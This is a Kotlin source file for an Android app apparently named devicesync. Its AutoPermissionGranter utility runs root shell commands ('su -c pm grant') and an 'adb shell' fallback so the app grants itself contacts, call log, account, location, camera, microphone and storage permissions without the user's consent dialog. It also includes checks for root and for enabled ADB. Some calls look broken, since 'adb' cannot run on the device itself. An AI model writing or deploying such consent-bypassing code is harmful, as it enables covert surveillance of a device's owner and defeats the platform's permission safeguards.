package com.devicesync.app.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import java.io.BufferedReader
import java.io.InputStreamReader

object AutoPermissionGranter {
    
    private const val TAG = "AutoPermissionGranter"
    
    // All dangerous permissions that can be granted via ADB
    private val ALL_DANGEROUS_PERMISSIONS = arrayOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.GET_ACCOUNTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.BLUETOOTH_SCAN,
        Manifest.permission.BLUETOOTH_CONNECT,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_MEDIA_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_MEDIA_LOCATION,
        Manifest.permission.MANAGE_EXTERNAL_STORAGE
    )
    
    /**
     * Grant all permissions using ADB commands
     * This requires the app to be installed and ADB to be enabled
     */
    fun grantAllPermissionsViaADB(context: Context): Boolean {
        return try {
            val packageName = context.packageName
            var successCount = 0
            
            ALL_DANGEROUS_PERMISSIONS.forEach { permission ->
                if (grantPermissionViaADB(packageName, permission)) {
                    successCount++
                    Log.d(TAG, "Granted permission: $permission")
                } else {
                    Log.w(TAG, "Failed to grant permission: $permission")
                }
            }
            
            val success = successCount > 0
            Log.d(TAG, "Granted $successCount out of ${ALL_DANGEROUS_PERMISSIONS.size} permissions")
            
            if (success) {
                Toast.makeText(context, "Granted $successCount permissions automatically!", Toast.LENGTH_LONG).show()
            }
            
            success
        } catch (e: Exception) {
            Log.e(TAG, "Error granting permissions via ADB", e)
            false
        }
    }
    
    /**
     * Grant a specific permission via ADB
     */
    private fun grantPermissionViaADB(packageName: String, permission: String): Boolean {
        return try {
            val command = "pm grant $packageName $permission"
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            val exitCode = process.waitFor()
            
            if (exitCode == 0) {
                Log.d(TAG, "Successfully granted $permission")
                true
            } else {
                // Try without root
                val nonRootCommand = "adb shell pm grant $packageName $permission"
                val nonRootProcess = Runtime.getRuntime().exec(nonRootCommand)
                val nonRootExitCode = nonRootProcess.waitFor()
                
                nonRootExitCode == 0
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing ADB command for $permission", e)
            false
        }
    }
    
    /**
     * Grant permissions using shell commands (requires root or ADB)
     */
    fun grantPermissionsViaShell(context: Context): Boolean {
        return try {
            val packageName = context.packageName
            val commands = ALL_DANGEROUS_PERMISSIONS.map { permission ->
                "pm grant $packageName $permission"
            }
            
            val shellScript = commands.joinToString("\n")
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", shellScript))
            val exitCode = process.waitFor()
            
            val success = exitCode == 0
            if (success) {
                Toast.makeText(context, "All permissions granted via shell!", Toast.LENGTH_LONG).show()
            }
            
            success
        } catch (e: Exception) {
            Log.e(TAG, "Error granting permissions via shell", e)
            false
        }
    }
    
    /**
     * Check if device is rooted
     */
    fun isDeviceRooted(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec("su")
            val exitCode = process.waitFor()
            exitCode == 0
        } catch (e: Exception) {
            false
        }
    }
    
    /**
     * Check if ADB is enabled
     */
    fun isADBEnabled(context: Context): Boolean {
        return try {
            val adbEnabled = Settings.Global.getInt(context.contentResolver, Settings.Global.ADB_ENABLED, 0)
            adbEnabled == 1
        } catch (e: Exception) {
            false
        }
    }
    
    /**
     * Get permission status summary after granting
     */
    fun getPermissionStatusAfterGranting(context: Context): Map<String, Boolean> {
        return ALL_DANGEROUS_PERMISSIONS.associate { permission ->
            permission to (context.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED)
        }
    }
    
    /**
     * Grant permissions for specific categories
     */
    fun grantPermissionCategory(context: Context, category: String): Boolean {
        val permissions = when (category.lowercase()) {
            "contacts" -> arrayOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.GET_ACCOUNTS
            )
            "bluetooth" -> arrayOf(
                Manifest.permission.BLUETOOTH_SCAN,
                Manifest.permission.BLUETOOTH_CONNECT
            )
            "location" -> arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
            "storage" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                arrayOf(
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.READ_MEDIA_AUDIO
                )
            } else {
                arrayOf(
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                )
            }
            "camera" -> arrayOf(
                Manifest.permission.CAMERA
            )
            "microphone" -> arrayOf(
                Manifest.permission.RECORD_AUDIO
            )
            else -> emptyArray()
        }
        
        return grantSpecificPermissions(context, permissions)
    }
    
    /**
     * Grant specific permissions
     */
    private fun grantSpecificPermissions(context: Context, permissions: Array<String>): Boolean {
        return try {
            val packageName = context.packageName
            var successCount = 0
            
            permissions.forEach { permission ->
                if (grantPermissionViaADB(packageName, permission)) {
                    successCount++
                }
            }
            
            val success = successCount > 0
            if (success) {
                Toast.makeText(context, "Granted $successCount permissions!", Toast.LENGTH_SHORT).show()
            }
            
            success
        } catch (e: Exception) {
            Log.e(TAG, "Error granting specific permissions", e)
            false
        }
    }
    
    /**
     * Check if all permissions are granted
     */
    fun areAllPermissionsGranted(context: Context): Boolean {
        return ALL_DANGEROUS_PERMISSIONS.all { permission ->
            context.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    /**
     * Get missing permissions count
     */
    fun getMissingPermissionsCount(context: Context): Int {
        return ALL_DANGEROUS_PERMISSIONS.count { permission ->
            context.checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED
        }
    }
} 